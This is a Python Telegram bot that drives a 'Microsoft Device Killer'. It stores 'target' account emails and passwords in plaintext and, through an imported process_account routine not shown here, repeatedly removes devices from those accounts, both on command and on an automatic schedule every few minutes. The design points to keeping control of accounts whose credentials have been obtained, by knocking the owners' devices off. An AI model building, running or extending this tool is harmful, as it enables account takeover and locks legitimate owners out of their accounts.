import asyncio
import logging
import threading
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from database import SessionLocal, TargetAccount, ExecutionLog, init_db
from device_killer import process_account
from config import Config

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize database
init_db()

# Helper to check if user is admin
async def is_admin(update: Update) -> bool:
    if update.effective_chat.id != Config.ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Unauthorized. This bot is for personal use only.")
        return False
    return True

# Add log entry
def add_log(account_email, account_id, action, result, details, devices_removed=0):
    db = SessionLocal()
    try:
        log = ExecutionLog(
            account_email=account_email,
            account_id=account_id,
            action=action,
            result=result,
            details=details,
            devices_removed=devices_removed
        )
        db.add(log)
        db.commit()
    except Exception as e:
        logger.error(f"Failed to add log: {e}")
    finally:
        db.close()

# ============ COMMAND HANDLERS ============

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    await update.message.reply_text(
        "🔐 *MICROSOFT DEVICE KILLER BOT*\n\n"
        "I control your deployed Microsoft account device remover.\n\n"
        "*📋 COMMANDS:*\n"
        "`/add email password` - Add target account\n"
        "`/list` - Show all accounts\n"
        "`/activate <id>` - Enable account processing\n"
        "`/deactivate <id>` - Disable account processing\n"
        "`/run <id>` - Process single account now\n"
        "`/runall` - Process all active accounts now\n"
        "`/remove <id>` - Delete account\n"
        "`/stats <id>` - Show account statistics\n"
        "`/logs <id>` - Show recent logs\n"
        "`/help` - This message\n\n"
        "*💡 TIP:* Accounts are processed automatically every 5 minutes if active.",
        parse_mode="Markdown"
    )

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: `/add email password`", parse_mode="Markdown")
        return
    
    email = context.args[0]
    password = ' '.join(context.args[1:])
    
    db = SessionLocal()
    try:
        existing = db.query(TargetAccount).filter_by(email=email).first()
        if existing:
            await update.message.reply_text(f"⚠️ Account {email} already exists (ID: {existing.id})")
            return
        
        account = TargetAccount(email=email, password=password, active=True)
        db.add(account)
        db.commit()
        
        add_log(email, account.id, "ADD", "Success", "Account added to target list")
        
        await update.message.reply_text(
            f"✅ *Account Added*\n"
            f"📧 Email: `{email}`\n"
            f"🆔 ID: `{account.id}`\n"
            f"🎯 Status: Active",
            parse_mode="Markdown"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    finally:
        db.close()

async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    db = SessionLocal()
    try:
        accounts = db.query(TargetAccount).all()
        if not accounts:
            await update.message.reply_text("📭 No accounts in database.")
            return
        
        msg = "*📋 TARGET ACCOUNTS*\n\n"
        for acc in accounts:
            status_icon = "🟢 ACTIVE" if acc.active else "🔴 INACTIVE"
            msg += f"*ID {acc.id}* | {status_icon}\n"
            msg += f"📧 `{acc.email}`\n"
            msg += f"📊 Status: {acc.status} | Devices removed: {acc.devices_removed}\n"
            if acc.last_run:
                msg += f"⏱️ Last run: {acc.last_run.strftime('%Y-%m-%d %H:%M')}\n"
            msg += "\n"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    finally:
        db.close()

async def cmd_activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/activate <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        acc.active = True
        db.commit()
        
        add_log(acc.email, acc.id, "ACTIVATE", "Success", "Account activated")
        
        await update.message.reply_text(f"✅ Activated `{acc.email}` (ID {aid})", parse_mode="Markdown")
    finally:
        db.close()

async def cmd_deactivate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/deactivate <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        acc.active = False
        db.commit()
        
        add_log(acc.email, acc.id, "DEACTIVATE", "Success", "Account deactivated")
        
        await update.message.reply_text(f"🔴 Deactivated `{acc.email}` (ID {aid})", parse_mode="Markdown")
    finally:
        db.close()

async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/run <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    await update.message.reply_text(f"⏳ Processing account ID {aid}...")
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        # Process account
        result = process_account(acc)
        
        # Update database
        acc.last_run = datetime.utcnow()
        acc.devices_removed += result['devices_removed']
        acc.status = "Success" if result['success'] else "Failed"
        acc.error_message = result['message'] if not result['success'] else None
        db.commit()
        
        # Add log
        add_log(acc.email, acc.id, "MANUAL_RUN", 
                "Success" if result['success'] else "Failed", 
                result['message'], result['devices_removed'])
        
        # Send result
        status_icon = "✅" if result['success'] else "❌"
        await update.message.reply_text(
            f"{status_icon} *Account: {acc.email}*\n"
            f"📊 Result: {result['message']}\n"
            f"🗑️ Devices removed this run: {result['devices_removed']}\n"
            f"📈 Total devices removed: {acc.devices_removed}",
            parse_mode="Markdown"
        )
    finally:
        db.close()

async def cmd_runall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    db = SessionLocal()
    try:
        accounts = db.query(TargetAccount).filter_by(active=True).all()
        if not accounts:
            await update.message.reply_text("📭 No active accounts to process.")
            return
        
        await update.message.reply_text(f"⏳ Processing {len(accounts)} active accounts...")
        
        results = []
        for acc in accounts:
            result = process_account(acc)
            
            # Update database
            acc.last_run = datetime.utcnow()
            acc.devices_removed += result['devices_removed']
            acc.status = "Success" if result['success'] else "Failed"
            acc.error_message = result['message'] if not result['success'] else None
            db.commit()
            
            # Add log
            add_log(acc.email, acc.id, "AUTO_RUN", 
                    "Success" if result['success'] else "Failed", 
                    result['message'], result['devices_removed'])
            
            results.append(f"{acc.email}: {result['message']} ({result['devices_removed']} removed)")
        
        # Send summary
        summary = "*📊 BATCH PROCESSING COMPLETE*\n\n"
        summary += "\n".join(results)
        await update.message.reply_text(summary[:4000], parse_mode="Markdown")
        
    finally:
        db.close()

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/remove <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        email = acc.email
        
        add_log(email, acc.id, "REMOVE", "Success", "Account removed from target list")
        
        db.delete(acc)
        db.commit()
        
        await update.message.reply_text(f"🗑️ Removed `{email}` (ID {aid})", parse_mode="Markdown")
    finally:
        db.close()

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/stats <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        msg = f"*📊 STATISTICS FOR ID {aid}*\n\n"
        msg += f"📧 Email: `{acc.email}`\n"
        msg += f"🎯 Status: {'🟢 Active' if acc.active else '🔴 Inactive'}\n"
        msg += f"📈 Devices removed total: `{acc.devices_removed}`\n"
        msg += f"🔧 Last status: {acc.status}\n"
        if acc.last_run:
            msg += f"⏱️ Last run: {acc.last_run.strftime('%Y-%m-%d %H:%M:%S')}\n"
        if acc.error_message:
            msg += f"⚠️ Last error: {acc.error_message}\n"
        msg += f"📅 Created: {acc.created_at.strftime('%Y-%m-%d %H:%M:%S')}"
        
        await update.message.reply_text(msg, parse_mode="Markdown")
    finally:
        db.close()

async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/logs <id>`", parse_mode="Markdown")
        return
    
    try:
        aid = int(context.args[0])
    except:
        await update.message.reply_text("❌ ID must be a number.")
        return
    
    db = SessionLocal()
    try:
        acc = db.query(TargetAccount).get(aid)
        if not acc:
            await update.message.reply_text(f"❌ Account ID {aid} not found.")
            return
        
        logs = db.query(ExecutionLog).filter_by(account_id=aid).order_by(ExecutionLog.timestamp.desc()).limit(15).all()
        
        if not logs:
            await update.message.reply_text(f"📭 No logs for account ID {aid}")
            return
        
        msg = f"*📋 LAST 15 LOGS FOR ID {aid}*\n\n"
        for log in logs:
            timestamp = log.timestamp.strftime('%m-%d %H:%M')
            icon = "✅" if log.result == "Success" else "❌"
            msg += f"{icon} `{timestamp}` | {log.action} | {log.result}\n"
            if log.details:
                msg += f"   📝 {log.details[:80]}\n"
        
        await update.message.reply_text(msg[:4000], parse_mode="Markdown")
    finally:
        db.close()

# ============ AUTO SCHEDULER ============

def auto_process_accounts():
    """Background thread function to process active accounts automatically"""
    import time
    while True:
        try:
            logger.info("[AUTO] Starting automatic scan...")
            db = SessionLocal()
            try:
                accounts = db.query(TargetAccount).filter_by(active=True).all()
                for acc in accounts:
                    logger.info(f"[AUTO] Processing {acc.email}")
                    result = process_account(acc)
                    
                    # Update database
                    acc.last_run = datetime.utcnow()
                    acc.devices_removed += result['devices_removed']
                    acc.status = "Success" if result['success'] else "Failed"
                    acc.error_message = result['message'] if not result['success'] else None
                    db.commit()
                    
                    # Add log
                    add_log(acc.email, acc.id, "AUTO_SCAN", 
                            "Success" if result['success'] else "Failed", 
                            result['message'], result['devices_removed'])
                    
                    logger.info(f"[AUTO] {acc.email}: {result['message']}")
                    
                    time.sleep(2)  # Small delay between accounts
            finally:
                db.close()
        except Exception as e:
            logger.error(f"[AUTO] Error: {e}")
        
        time.sleep(Config.AUTO_SCAN_INTERVAL)

def start_scheduler():
    """Start background thread for automatic scanning"""
    thread = threading.Thread(target=auto_process_accounts, daemon=True)
    thread.start()
    logger.info(f"[*] Auto-scheduler started. Scanning every {Config.AUTO_SCAN_INTERVAL} seconds")

# ============ MAIN ============

def main():
    # Start background scheduler
    start_scheduler()
    
    # Setup Telegram bot
    app = Application.builder().token(Config.TELEGRAM_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("list", cmd_list))
    app.add_handler(CommandHandler("activate", cmd_activate))
    app.add_handler(CommandHandler("deactivate", cmd_deactivate))
    app.add_handler(CommandHandler("run", cmd_run))
    app.add_handler(CommandHandler("runall", cmd_runall))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("logs", cmd_logs))
    
    logger.info("[*] Telegram bot started. Waiting for commands...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()